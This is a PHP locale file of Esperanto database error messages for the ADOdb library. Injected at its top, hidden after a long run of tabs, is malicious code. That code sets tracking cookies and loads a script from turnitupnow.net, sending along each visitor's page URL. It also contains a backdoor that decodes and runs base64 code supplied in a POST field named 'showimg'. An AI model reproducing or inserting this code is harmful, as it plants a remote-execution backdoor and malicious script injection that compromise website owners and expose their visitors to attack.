<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Vivu Esperanto cxiam! 
// Traduko fare de Antono Vasiljev (anders[#]brainactive.org)

$ADODB_LANG_ARRAY = array (
             'LANG'                      => 'eo',
            DB_ERROR                    => 'nekonata eraro',
            DB_ERROR_ALREADY_EXISTS     => 'jam ekzistas',
            DB_ERROR_CANNOT_CREATE      => 'maleblas krei',
            DB_ERROR_CANNOT_DELETE      => 'maleblas elimini',
            DB_ERROR_CANNOT_DROP        => 'maleblas elimini (drop)',
            DB_ERROR_CONSTRAINT         => 'rompo de kondicxoj de provo',
            DB_ERROR_DIVZERO            => 'divido per 0 (nul)',
            DB_ERROR_INVALID            => 'malregule',
            DB_ERROR_INVALID_DATE       => 'malregula dato kaj tempo',
            DB_ERROR_INVALID_NUMBER     => 'malregula nombro',
            DB_ERROR_MISMATCH           => 'eraro',
            DB_ERROR_NODBSELECTED       => 'datumbazo ne elektita',
            DB_ERROR_NOSUCHFIELD        => 'ne ekzistas kampo',
            DB_ERROR_NOSUCHTABLE        => 'ne ekzistas tabelo',
            DB_ERROR_NOT_CAPABLE        => 'DBMS ne povas',
            DB_ERROR_NOT_FOUND          => 'ne trovita',
            DB_ERROR_NOT_LOCKED         => 'ne blokita',
            DB_ERROR_SYNTAX             => 'sintaksa eraro',
            DB_ERROR_UNSUPPORTED        => 'ne apogata',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'nombrilo de valoroj en linio',
            DB_ERROR_INVALID_DSN        => 'malregula DSN-o',
            DB_ERROR_CONNECT_FAILED     => 'konekto malsukcesa',
            0                               => 'cxio bone', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'ne suficxe da datumo',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'etendo ne trovita',
            DB_ERROR_NOSUCHDB           => 'datumbazo ne ekzistas',
            DB_ERROR_ACCESS_VIOLATION   => 'ne suficxe da rajto por atingo'
);
?>